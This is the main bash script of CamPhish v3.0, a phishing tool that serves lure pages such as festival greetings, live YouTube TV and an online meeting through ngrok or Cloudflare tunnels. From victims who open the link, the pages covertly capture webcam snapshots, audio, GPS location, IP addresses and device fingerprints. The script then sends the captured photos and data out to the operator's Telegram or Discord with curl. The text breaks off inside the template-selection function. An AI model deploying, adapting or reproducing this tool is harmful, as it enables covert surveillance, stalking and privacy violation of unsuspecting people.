#!/bin/bash
# CamPhish v3.0
# Powered by TechChip

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 3.0 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"

printf "\n"


}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' "$session_dir/ip.txt" | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat "$session_dir/ip.txt" >> "$session_dir/saved.ip.txt"
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "$session_dir/current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" "$session_dir/current_location.txt"
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv "$session_dir/current_location.txt" "$session_dir/current_location.bak"
  fi

  # Then check for any location_* files
  if [[ -e "$session_dir/location_"* ]]; then
    location_file=$(ls "$session_dir"/location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to %s\e[0m\n" "$location_file"

    # Send notification with location data
    send_notification "📍 Location Captured
Latitude: $lat
Longitude: $lon
Accuracy: $acc meters
Google Maps: $maps_link"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
  fi
}

# ─────────────────────────────────────────────
# Session management
# ─────────────────────────────────────────────
create_session() {
session_dir="sessions/$(date +%Y%m%d_%H%M%S)_$$"
mkdir -p "$session_dir"
echo "$session_dir" > session_dir.txt
printf "\e[1;92m[\e[0m+\e[1;92m] Session directory:\e[0m\e[1;77m %s\e[0m\n" "$session_dir"
}

# ─────────────────────────────────────────────
# Camera mode selection
# ─────────────────────────────────────────────
select_camera_mode() {
printf "\n-----Choose camera mode----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Front camera (user)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Rear camera (environment)\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose camera mode: [Default is 1] \e[0m' option_cam
option_cam="${option_cam:-1}"
if [[ $option_cam -eq 2 ]]; then
  cam_facing_mode="environment"
else
  cam_facing_mode="user"
fi
printf "\e[1;92m[\e[0m*\e[1;92m] Camera mode:\e[0m\e[1;77m %s\e[0m\n" "$cam_facing_mode"
}

# ─────────────────────────────────────────────
# Capture interval selection
# ─────────────────────────────────────────────
select_capture_interval() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Capture interval in ms (min 500): [Default is 1500] \e[0m' option_interval
option_interval="${option_interval:-1500}"
if [[ ! "$option_interval" =~ ^[0-9]+$ ]] || [[ "$option_interval" -lt 500 ]]; then
  printf "\e[1;93m [!] Invalid interval, using 1500 ms\e[0m\n"
  option_interval=1500
fi
cam_interval_ms="$option_interval"
printf "\e[1;92m[\e[0m*\e[1;92m] Capture interval:\e[0m\e[1;77m %s ms\e[0m\n" "$cam_interval_ms"
}

# ─────────────────────────────────────────────
# Custom page title and favicon
# ─────────────────────────────────────────────
get_custom_title_favicon() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom page title (leave blank for default): \e[0m' custom_page_title
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom favicon URL (leave blank for none): \e[0m' custom_favicon_url
}

# ─────────────────────────────────────────────
# QR code generation
# ─────────────────────────────────────────────
generate_qr() {
local url="$1"
printf "\n\e[1;92m[\e[0m*\e[1;92m] QR Code for the link:\e[0m\n"
if command -v qrencode > /dev/null 2>&1; then
  qrencode -t ANSIUTF8 -o - "$url" 2>/dev/null
else
  printf "\e[1;93m[\e[0m!\e[1;93m] Install 'qrencode' for terminal QR display (apt install qrencode)\e[0m\n"
  printf "\e[1;93m[\e[0m*\e[1;93m] Generate QR online: https://qr.io/?url=%s\e[0m\n" "$url"
fi
printf "\n"
}

# ─────────────────────────────────────────────
# Notification setup and dispatch
# ─────────────────────────────────────────────
setup_notifications() {
printf "\n-----Notification settings----\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enable real-time notifications? [y/N]: \e[0m' enable_notif
if [[ "$enable_notif" == "y" || "$enable_notif" == "Y" ]]; then
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Telegram\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m\n"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose notification type: \e[0m' option_notif
  if [[ $option_notif -eq 1 ]]; then
    notif_type="telegram"
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Telegram Bot Token: \e[0m' telegram_token
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Telegram Chat ID: \e[0m' telegram_chat_id
    printf "\e[1;92m[\e[0m*\e[1;92m] Telegram notifications enabled\e[0m\n"
  elif [[ $option_notif -eq 2 ]]; then
    notif_type="discord"
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Discord Webhook URL: \e[0m' discord_webhook
    printf "\e[1;92m[\e[0m*\e[1;92m] Discord notifications enabled\e[0m\n"
  else
    notif_type=""
    printf "\e[1;93m[\e[0m!\e[1;93m] Invalid choice, notifications disabled\e[0m\n"
  fi
else
  notif_type=""
fi
}

send_notification() {
local message="$1"
local photo_file="${2:-}"

if [[ -z "$notif_type" ]]; then
  return
fi

if [[ "$notif_type" == "telegram" ]]; then
  if [[ -n "$photo_file" && -f "$photo_file" ]]; then
    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendPhoto" \
      -F "chat_id=${telegram_chat_id}" \
      -F "photo=@${photo_file}" \
      -F "caption=${message}" > /dev/null 2>&1 &
  else
    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendMessage" \
      --data-urlencode "chat_id=${telegram_chat_id}" \
      --data-urlencode "text=${message}" > /dev/null 2>&1 &
  fi
elif [[ "$notif_type" == "discord" ]]; then
  if [[ -n "$photo_file" && -f "$photo_file" ]]; then
    curl -s -X POST "${discord_webhook}" \
      -F "payload_json={\"content\": \"$(printf '%s' "$message" | sed 's/"/\\"/g')\"}" \
      -F "file=@${photo_file}" > /dev/null 2>&1 &
  else
    local escaped
    # Escape for JSON string value: backslash, double-quote, then common control chars
    escaped=$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g; s/	/\\t/g' | awk '{printf "%s\\n", $0}' | head -c -2)
    curl -s -X POST "${discord_webhook}" \
      -H "Content-Type: application/json" \
      -d "{\"content\": \"${escaped}\"}" > /dev/null 2>&1 &
  fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Session directory:\e[0m\e[1;77m %s\e[0m\n" "$session_dir"
while [ true ]; do

if [[ -e "$session_dir/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
send_notification "🎯 Target opened the link!
IP: $(grep -a 'IP:' "$session_dir/ip.txt" | cut -d ' ' -f2 | tr -d '\r' | head -n1)"
rm -rf "$session_dir/ip.txt"
fi

sleep 0.5

# Check for fingerprint data
if [[ -e "$session_dir/FingerprintLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Device fingerprint received!\e[0m\n"
if [[ -e "$session_dir/fingerprint.txt" ]]; then
  tail -n 10 "$session_dir/fingerprint.txt"
fi
rm -rf "$session_dir/FingerprintLog.log"
fi

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "$session_dir/current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "$session_dir/LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
rm -rf "$session_dir/LocationLog.log"
fi

# Silently discard error logs
if [[ -e "$session_dir/LocationError.log" ]]; then
rm -rf "$session_dir/LocationError.log"
fi

if [[ -e "$session_dir/Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
latest_cam=$(ls -t "$session_dir"/cam*.png 2>/dev/null | head -n 1)
if [[ -n "$latest_cam" ]]; then
  printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$latest_cam"
  send_notification "📷 Camera snapshot captured" "$latest_cam"
fi
rm -rf "$session_dir/Log.log"
fi

if [[ -e "$session_dir/AudioLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
latest_audio=$(ls -t "$session_dir"/audio*.webm 2>/dev/null | head -n 1)
if [[ -n "$latest_audio" ]]; then
  printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$latest_audio"
fi
send_notification "🎙️ Audio snippet captured: $(basename "$latest_audio")"
rm -rf "$session_dir/AudioLog.log"
fi

sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
generate_qr "$link"
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
generate_payload
}

generate_payload() {
# Set defaults for new placeholders if not provided
local title="${custom_page_title}"
local favicon="${custom_favicon_url}"
local facing="${cam_facing_mode:-user}"
local interval="${cam_interval_ms:-1500}"

# Default titles per template
if [[ -z "$title" ]]; then
  if [[ $option_tem -eq 1 ]]; then
    title="Happy ${fest_name} to Your Friends"
  elif [[ $option_tem -eq 2 ]]; then
    title="Live YouTube TV"
  else
    title="Online Meeting"
  fi
fi

sed "s+forwarding_link+${link}+g" template.php \
  | sed "s+page_title_placeholder+${title}+g" \
  | sed "s+favicon_url_placeholder+${favicon}+g" > index.php

if [[ $option_tem -eq 1 ]]; then
  sed "s+forwarding_link+${link}+g" festivalwishes.html \
    | sed "s+fes_name+${fest_name}+g" \
    | sed "s+cam_facing_mode+${facing}+g" \
    | sed "s+cam_interval_ms+${interval}+g" \
    | sed "s+page_title_placeholder+${title}+g" \
    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
elif [[ $option_tem -eq 2 ]]; then
  sed "s+forwarding_link+${link}+g" LiveYTTV.html \
    | sed "s+live_yt_tv+${yt_video_ID}+g" \
    | sed "s+cam_facing_mode+${facing}+g" \
    | sed "s+cam_interval_ms+${interval}+g" \
    | sed "s+page_title_placeholder+${title}+g" \
    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
else
  sed "s+forwarding_link+${link}+g" OnlineMeeting.html \
    | sed "s+cam_facing_mode+${facing}+g" \
    | sed "s+cam_interval_ms+${interval}+g" \
    | sed "s+page_title_placeholder+${title}+g" \
    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
fi
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
generate_qr "$link"
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
generate_payload
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

create_session

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
setup_notifications

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
